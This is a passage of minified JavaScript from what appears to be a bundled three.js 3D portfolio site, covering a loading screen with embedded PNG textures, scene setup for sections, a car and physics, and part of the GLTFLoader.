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",this.startingScreen.loadingLabel.texture=new S(this.startingScreen.loadingLabel.image),this.startingScreen.loadingLabel.texture.magFilter=1003,this.startingScreen.loadingLabel.texture.minFilter=1006,this.startingScreen.loadingLabel.texture.needsUpdate=!0,this.startingScreen.loadingLabel.material=new qe({transparent:!0,depthWrite:!1,color:16777215,alphaMap:this.startingScreen.loadingLabel.texture}),this.startingScreen.loadingLabel.mesh=new Lt(this.startingScreen.loadingLabel.geometry,this.startingScreen.loadingLabel.material),this.startingScreen.loadingLabel.mesh.matrixAutoUpdate=!1,this.container.add(this.startingScreen.loadingLabel.mesh),this.startingScreen.startLabel={},this.startingScreen.startLabel.geometry=new si(2.5,.625),this.startingScreen.startLabel.image=new Image,this.startingScreen.startLabel.image.src="data:image/png;base64,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",this.startingScreen.startLabel.texture=new S(this.startingScreen.startLabel.image),this.startingScreen.startLabel.texture.magFilter=1003,this.startingScreen.startLabel.texture.minFilter=1006,this.startingScreen.startLabel.texture.needsUpdate=!0,this.startingScreen.startLabel.material=new qe({transparent:!0,depthWrite:!1,color:16777215,alphaMap:this.startingScreen.startLabel.texture}),this.startingScreen.startLabel.material.opacity=0,this.startingScreen.startLabel.mesh=new Lt(this.startingScreen.startLabel.geometry,this.startingScreen.startLabel.material),this.startingScreen.startLabel.mesh.matrixAutoUpdate=!1,this.container.add(this.startingScreen.startLabel.mesh),this.resources.on("progress",(function(t){e.startingScreen.area.floorBorder.material.uniforms.uAlpha.value=1,e.startingScreen.area.floorBorder.material.uniforms.uLoadProgress.value=t})),this.resources.on("ready",(function(){window.requestAnimationFrame((function(){e.startingScreen.area.activate(),Du.e.to(e.startingScreen.area.floorBorder.material.uniforms.uAlpha,.3,{value:.3}),Du.e.to(e.startingScreen.loadingLabel.material,.3,{opacity:0}),Du.e.to(e.startingScreen.startLabel.material,.3,{opacity:1,delay:.3})}))})),this.startingScreen.area.on("interact",(function(){e.startingScreen.area.deactivate(),Du.e.to(e.startingScreen.area.floorBorder.material.uniforms.uProgress,.3,{value:0,delay:.4}),Du.e.to(e.startingScreen.startLabel.material,.3,{opacity:0,delay:.4}),e.start(),window.setTimeout((function(){e.reveal.go()}),600)}))}},{key:"setSounds",value:function(){this.sounds=new Lp({debug:this.debugFolder,time:this.time})}},{key:"setAxes",value:function(){this.axis=new Dl,this.container.add(this.axis)}},{key:"setControls",value:function(){this.controls=new ap({config:this.config,sizes:this.sizes,time:this.time,camera:this.camera,sounds:this.sounds})}},{key:"setMaterials",value:function(){this.materials=new hu({resources:this.resources,debug:this.debugFolder})}},{key:"setFloor",value:function(){this.floor=new du({debug:this.debugFolder}),this.container.add(this.floor.container)}},{key:"setShadows",value:function(){this.shadows=new yu({time:this.time,debug:this.debugFolder,renderer:this.renderer,camera:this.camera}),this.container.add(this.shadows.container)}},{key:"setPhysics",value:function(){this.physics=new _u({config:this.config,debug:this.debug,time:this.time,sizes:this.sizes,controls:this.controls,sounds:this.sounds}),this.container.add(this.physics.models.container)}},{key:"setZones",value:function(){this.zones=new Pu({time:this.time,physics:this.physics,debug:this.debugFolder}),this.container.add(this.zones.container)}},{key:"setAreas",value:function(){this.areas=new Ku({config:this.config,resources:this.resources,debug:this.debug,renderer:this.renderer,camera:this.camera,car:this.car,sounds:this.sounds,time:this.time}),this.container.add(this.areas.container)}},{key:"setTiles",value:function(){this.tiles=new td({resources:this.resources,objects:this.objects,debug:this.debug})}},{key:"setWalls",value:function(){this.walls=new ad({resources:this.resources,objects:this.objects})}},{key:"setObjects",value:function(){this.objects=new Ou({time:this.time,resources:this.resources,materials:this.materials,physics:this.physics,shadows:this.shadows,sounds:this.sounds,debug:this.debugFolder}),this.container.add(this.objects.container)}},{key:"setCar",value:function(){this.car=new Bu({time:this.time,resources:this.resources,objects:this.objects,physics:this.physics,shadows:this.shadows,materials:this.materials,controls:this.controls,sounds:this.sounds,renderer:this.renderer,camera:this.camera,debug:this.debugFolder,config:this.config}),this.container.add(this.car.container)}},{key:"setSections",value:function(){this.sections={};var e={config:this.config,time:this.time,resources:this.resources,camera:this.camera,passes:this.passes,objects:this.objects,areas:this.areas,zones:this.zones,walls:this.walls,tiles:this.tiles,debug:this.debugFolder};this.sections.intro=new ud(Fp({},e,{x:0,y:0})),this.container.add(this.sections.intro.container),this.sections.crossroads=new qd(Fp({},e,{x:0,y:-30})),this.container.add(this.sections.crossroads.container),this.sections.projects=new Gd(Fp({},e,{x:30,y:-30})),this.container.add(this.sections.projects.container),this.sections.information=new Yd(Fp({},e,{x:1.2,y:-55})),this.container.add(this.sections.information.container),this.sections.playground=new Qd(Fp({},e,{x:-38,y:-34})),this.container.add(this.sections.playground.container)}},{key:"setEasterEggs",value:function(){this.easterEggs=new Dp({resources:this.resources,car:this.car,walls:this.walls,objects:this.objects,materials:this.materials,areas:this.areas,config:this.config,physics:this.physics}),this.container.add(this.easterEggs.container)}}])&&jp(t.prototype,i),n&&jp(t,n),e}(),Vp=function(){function e(e){Qa.call(this,e),this.dracoLoader=null,this.ddsLoader=null}function t(){var e={};return{get:function(t){return e[t]},add:function(t,i){e[t]=i},remove:function(t){delete e[t]},removeAll:function(){e={}}}}e.prototype=Object.assign(Object.create(Qa.prototype),{constructor:e,load:function(e,t,i,n){var r,o=this;r=""!==this.resourcePath?this.resourcePath:""!==this.path?this.path:Vs(e),o.manager.itemStart(e);var a=function(t){n?n(t):console.error(t),o.manager.itemError(e),o.manager.itemEnd(e)},s=new Ja(o.manager);s.setPath(this.path),s.setResponseType("arraybuffer"),"use-credentials"===o.crossOrigin&&s.setWithCredentials(!0),s.load(e,(function(i){try{o.parse(i,r,(function(i){t(i),o.manager.itemEnd(e)}),a)}catch(e){a(e)}}),i,a)},setDRACOLoader:function(e){return this.dracoLoader=e,this},setDDSLoader:function(e){return this.ddsLoader=e,this},parse:function(e,t,s,c){var p,f={};if("string"==typeof e)p=e;else if(Us(new Uint8Array(e,0,4))===a){try{f[i.KHR_BINARY_GLTF]=new l(e)}catch(e){return void(c&&c(e))}p=f[i.KHR_BINARY_GLTF].content}else p=Us(new Uint8Array(e));var m=JSON.parse(p);if(void 0===m.asset||m.asset.version[0]<2)c&&c(new Error("THREE.GLTFLoader: Unsupported asset. glTF versions >=2.0 are supported. Use LegacyGLTFLoader instead."));else{if(m.extensionsUsed)for(var v=0;v<m.extensionsUsed.length;++v){var g=m.extensionsUsed[v],y=m.extensionsRequired||[];switch(g){case i.KHR_LIGHTS_PUNCTUAL:f[g]=new r(m);break;case i.KHR_MATERIALS_UNLIT:f[g]=new o;break;case i.KHR_MATERIALS_PBR_SPECULAR_GLOSSINESS:f[g]=new d;break;case i.KHR_DRACO_MESH_COMPRESSION:f[g]=new h(m,this.dracoLoader);break;case i.MSFT_TEXTURE_DDS:f[i.MSFT_TEXTURE_DDS]=new n(this.ddsLoader);break;case i.KHR_TEXTURE_TRANSFORM:f[i.KHR_TEXTURE_TRANSFORM]=new u;break;default:y.indexOf(g)>=0&&console.warn('THREE.GLTFLoader: Unknown extension "'+g+'".')}}new V(m,f,{path:t||this.resourcePath||"",crossOrigin:this.crossOrigin,manager:this.manager}).parse(s,c)}}});var i={KHR_BINARY_GLTF:"KHR_binary_glTF",KHR_DRACO_MESH_COMPRESSION:"KHR_draco_mesh_compression",KHR_LIGHTS_PUNCTUAL:"KHR_lights_punctual",KHR_MATERIALS_PBR_SPECULAR_GLOSSINESS:"KHR_materials_pbrSpecularGlossiness",KHR_MATERIALS_UNLIT:"KHR_materials_unlit",KHR_TEXTURE_TRANSFORM:"KHR_texture_transform",MSFT_TEXTURE_DDS:"MSFT_texture_dds"};function n(e){if(!e)throw new Error("THREE.GLTFLoader: Attempting to load .dds texture without importing DDSLoader");this.name=i.MSFT_TEXTURE_DDS,this.ddsLoader=e}function r(e){this.name=i.KHR_LIGHTS_PUNCTUAL;var t=e.extensions&&e.extensions[i.KHR_LIGHTS_PUNCTUAL]||{};this.lightDefs=t.lights||[]}function o(){this.name=i.KHR_MATERIALS_UNLIT}r.prototype.loadLight=function(e){var t,i=this.lightDefs[e],n=new Ne(16777215);void 0!==i.color&&n.fromArray(i.color);var r=void 0!==i.range?i.range:0;switch(i.type){case"directional":(t=new zs(n)).target.position.set(0,0,-1),t.add(t.target);break;case"point":(t=new Is(n)).distance=r;break;case"spot":(t=new ks(n)).distance=r,i.spot=i.spot||{},i.spot.innerConeAngle=void 0!==i.spot.innerConeAngle?i.spot.innerConeAngle:0,i.spot.outerConeAngle=void 0!==i.spot.outerConeAngle?i.spot.outerConeAngle:Math.PI/4,t.angle=i.spot.outerConeAngle,t.penumbra=1-i.spot.innerConeAngle/i.spot.outerConeAngle,t.target.position.set(0,0,-1),t.add(t.target);break;default:throw new Error('THREE.GLTFLoader: Unexpected light type, "'+i.type+'".')}return t.position.set(0,0,0),t.decay=2,void 0!==i.intensity&&(t.intensity=i.intensity),t.name=i.name||"light_"+e,Promise.resolve(t)},o.prototype.getMaterialType=function(){return qe},o.prototype.extendParams=function(e,t,i){var n=[];e.color=new Ne(1,1,1),e.opacity=1;var r=t.pbrMetallicRoughness;if(r){if(Array.isArray(r.baseColorFactor)){var o=r.baseColorFactor;e.color.fromArray(o),e.opacity=o[3]}void 0!==r.baseColorTexture&&n.push(i.assignTexture(e,"map",r.baseColorTexture))}return Promise.all(n)};var a="glTF",s=1313821514,c=5130562;function l(e){this.name=i.KHR_BINARY_GLTF,this.content=null,this.body=null;var t=new DataView(e,0,12);if(this.header={magic:Us(new Uint8Array(e.slice(0,4))),version:t.getUint32(4,!0),length:t.getUint32(8,!0)},this.header.magic!==a)throw new Error("THREE.GLTFLoader: Unsupported glTF-Binary header.");if(this.header.version<2)throw new Error("THREE.GLTFLoader: Legacy binary file detected. Use LegacyGLTFLoader instead.");for(var n=new DataView(e,12),r=0;r<n.byteLength;){var o=n.getUint32(r,!0);r+=4;var l=n.getUint32(r,!0);if(r+=4,l===s){var h=new Uint8Array(e,12+r,o);this.content=Us(h)}else if(l===c){var u=12+r;this.body=e.slice(u,u+o)}r+=o}if(null===this.content)throw new Error("THREE.GLTFLoader: JSON content not found.")}function h(e,t){if(!t)throw new Error("THREE.GLTFLoader: No DRACOLoader instance provided.");this.name=i.KHR_DRACO_MESH_COMPRESSION,this.json=e,this.dracoLoader=t}function u(){this.name=i.KHR_TEXTURE_TRANSFORM}function d(){return{name:i.KHR_MATERIALS_PBR_SPECULAR_GLOSSINESS,specularGlossinessParams:["color","map","lightMap","lightMapIntensity","aoMap","aoMapIntensity","emissive","emissiveIntensity","emissiveMap","bumpMap","bumpScale","normalMap","displacementMap","displacementScale","displacementBias","specularMap","specular","glossinessMap","glossiness","alphaMap","envMap","envMapIntensity","refractionRatio"],getMaterialType:function(){return Vt},extendParams:function(e,t,i){var n=t.extensions[this.name],r=ni.standard,o=Ut.clone(r.uniforms),a=["#ifdef USE_SPECULARMAP","\tuniform sampler2D specularMap;","#endif"].join("\n"),s=["#ifdef USE_GLOSSINESSMAP","\tuniform sampler2D glossinessMap;","#endif"].join("\n"),c=["vec3 specularFactor = specular;","#ifdef USE_SPECULARMAP","\tvec4 texelSpecular = texture2D( specularMap, vUv );","\ttexelSpecular = sRGBToLinear( texelSpecular );","\t// reads channel RGB, compatible with a glTF Specular-Glossiness (RGBA) texture","\tspecularFactor *= texelSpecular.rgb;","#endif"].join("\n"),l=["float glossinessFactor = glossiness;","#ifdef USE_GLOSSINESSMAP","\tvec4 texelGlossiness = texture2D( glossinessMap, vUv );","\t// reads channel A, compatible with a glTF Specular-Glossiness (RGBA) texture","\tglossinessFactor *= texelGlossiness.a;","#endif"].join("\n"),h=["PhysicalMaterial material;","material.diffuseColor = diffuseColor.rgb;","material.specularRoughness = clamp( 1.0 - glossinessFactor, 0.04, 1.0 );","material.specularColor = specularFactor.rgb;"].join("\n"),u=r.fragmentShader.replace("uniform float roughness;","uniform vec3 specular;").replace("uniform float metalness;","uniform float glossiness;").replace("#include <roughnessmap_pars_fragment>",a).replace("#include <metalnessmap_pars_fragment>",s).replace("#include <roughnessmap_fragment>",c).replace("#include <metalnessmap_fragment>",l).replace("#include <lights_physical_fragment>",h);delete o.roughness,delete o.metalness,delete o.roughnessMap,delete o.metalnessMap,o.specular={value:(new Ne).setHex(1118481)},o.glossiness={value:.5},o.specularMap={value:null},o.glossinessMap={value:null},e.vertexShader=r.vertexShader,e.fragmentShader=u,e.uniforms=o,e.defines={STANDARD:""},e.color=new Ne(1,1,1),e.opacity=1;var d=[];if(Array.isArray(n.diffuseFactor)){var p=n.diffuseFactor;e.color.fromArray(p),e.opacity=p[3]}if(void 0!==n.diffuseTexture&&d.push(i.assignTexture(e,"map",n.diffuseTexture)),e.emissive=new Ne(0,0,0),e.glossiness=void 0!==n.glossinessFactor?n.glossinessFactor:1,e.specular=new Ne(1,1,1),Array.isArray(n.specularFactor)&&e.specular.fromArray(n.specularFactor),void 0!==n.specularGlossinessTexture){var f=n.specularGlossinessTexture;d.push(i.assignTexture(e,"glossinessMap",f)),d.push(i.assignTexture(e,"specularMap",f))}return Promise.all(d)},createMaterial:function(e){var t=new Vt({defines:e.defines,vertexShader:e.vertexShader,fragmentShader:e.fragmentShader,uniforms:e.uniforms,fog:!0,lights:!0,opacity:e.opacity,transparent:e.transparent});return t.isGLTFSpecularGlossinessMaterial=!0,t.color=e.color,t.map=void 0===e.map?null:e.map,t.lightMap=null,t.lightMapIntensity=1,t.aoMap=void 0===e.aoMap?null:e.aoMap,t.aoMapIntensity=1,t.emissive=e.emissive,t.emissiveIntensity=1,t.emissiveMap=void 0===e.emissiveMap?null:e.emissiveMap,t.bumpMap=void 0===e.bumpMap?null:e.bumpMap,t.bumpScale=1,t.normalMap=void 0===e.normalMap?null:e.normalMap,e.normalScale&&(t.normalScale=e.normalScale),t.displacementMap=null,t.displacementScale=1,t.displacementBias=0,t.specularMap=void 0===e.specularMap?null:e.specularMap,t.specular=e.specular,t.glossinessMap=void 0===e.glossinessMap?null:e.glossinessMap,t.glossiness=e.glossiness,t.alphaMap=null,t.envMap=void 0===e.envMap?null:e.envMap,t.envMapIntensity=1,t.refractionRatio=.98,t.extensions.derivatives=!0,t},cloneMaterial:function(e){var t=e.clone();t.isGLTFSpecularGlossinessMaterial=!0;for(var i=this.specularGlossinessParams,n=0,r=i.length;n<r;n++){var o=e[i[n]];t[i[n]]=o&&o.isColor?o.clone():o}return t},refreshUniforms:function(e,t,i,n,r){if(!0===r.isGLTFSpecularGlossinessMaterial){var o,a=r.uniforms,s=r.defines;a.opacity.value=r.opacity,a.diffuse.value.copy(r.color),a.emissive.value.copy(r.emissive).multiplyScalar(r.emissiveIntensity),a.map.value=r.map,a.specularMap.value=r.specularMap,a.alphaMap.value=r.alphaMap,a.lightMap.value=r.lightMap,a.lightMapIntensity.value=r.lightMapIntensity,a.aoMap.value=r.aoMap,a.aoMapIntensity.value=r.aoMapIntensity,r.map?o=r.map:r.specularMap?o=r.specularMap:r.displacementMap?o=r.displacementMap:r.normalMap?o=r.normalMap:r.bumpMap?o=r.bumpMap:r.glossinessMap?o=r.glossinessMap:r.alphaMap?o=r.alphaMap:r.emissiveMap&&(o=r.emissiveMap),void 0!==o&&(o.isWebGLRenderTarget&&(o=o.texture),!0===o.matrixAutoUpdate&&o.updateMatrix(),a.uvTransform.value.copy(o.matrix)),r.envMap&&(a.envMap.value=r.envMap,a.envMapIntensity.value=r.envMapIntensity,a.flipEnvMap.value=r.envMap.isCubeTexture?-1:1,a.reflectivity.value=r.reflectivity,a.refractionRatio.value=r.refractionRatio,a.maxMipLevel.value=e.properties.get(r.envMap).__maxMipLevel),a.specular.value.copy(r.specular),a.glossiness.value=r.glossiness,a.glossinessMap.value=r.glossinessMap,a.emissiveMap.value=r.emissiveMap,a.bumpMap.value=r.bumpMap,a.normalMap.value=r.normalMap,a.displacementMap.value=r.displacementMap,a.displacementScale.value=r.displacementScale,a.displacementBias.value=r.displacementBias,null!==a.glossinessMap.value&&void 0===s.USE_GLOSSINESSMAP&&(s.USE_GLOSSINESSMAP="",s.USE_ROUGHNESSMAP=""),null===a.glossinessMap.value&&void 0!==s.USE_GLOSSINESSMAP&&(delete s.USE_GLOSSINESSMAP,delete s.USE_ROUGHNESSMAP)}}}}function m(e,t,i,n){Oa.call(this,e,t,i,n)}h.prototype.decodePrimitive=function(e,t){var i=this.json,n=this.dracoLoader,r=e.extensions[this.name].bufferView,o=e.extensions[this.name].attributes,a={},s={},c={};for(var l in o){var h=C[l]||l.toLowerCase();a[h]=o[l]}for(l in e.attributes){h=C[l]||l.toLowerCase();if(void 0!==o[l]){var u=i.accessors[e.attributes[l]],d=S[u.componentType];c[h]=d,s[h]=!0===u.normalized}}return t.getDependency("bufferView",r).then((function(e){return new Promise((function(t){n.decodeDracoFile(e,(function(e){for(var i in e.attributes){var n=e.attributes[i],r=s[i];void 0!==r&&(n.normalized=r)}t(e)}),a,c)}))}))},u.prototype.extendTexture=function(e,t){return e=e.clone(),void 0!==t.offset&&e.offset.fromArray(t.offset),void 